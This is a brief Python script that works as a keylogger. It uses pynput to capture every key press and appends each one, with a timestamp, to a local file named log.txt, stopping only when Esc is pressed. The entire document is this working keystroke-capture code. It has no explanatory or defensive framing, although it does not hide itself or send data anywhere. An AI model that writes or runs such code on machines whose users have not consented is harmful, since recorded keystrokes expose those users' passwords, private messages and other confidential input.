from pynput.keyboard import Key, Listener
from pathlib import Path
import logging

#Directory for log file
log_directory = ""

#Creating log file
logging.basicConfig(filename=(log_directory + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#Logging each key stroke
def on_press(key):
    logging.info(str(key))
#Stopping the logger
    if key == Key.esc:
        # Stop listener
        return False
with Listener(on_press= on_press) as listener:
    listener.join()
